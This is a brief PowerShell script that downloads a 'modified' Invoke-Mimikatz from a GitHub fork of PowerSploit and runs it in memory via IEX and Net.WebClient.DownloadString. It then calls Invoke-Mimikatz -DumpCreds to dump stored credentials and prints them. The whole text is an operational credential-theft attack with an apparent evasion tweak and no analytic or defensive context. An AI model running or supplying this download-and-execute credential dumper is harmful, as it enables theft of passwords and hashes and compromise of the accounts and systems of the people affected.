# load 'modified' :) version of Invoke-Mimikatz via PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/phra/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1')
# launch it
$m = Invoke-MImikatz -DumpCreds
$m
pause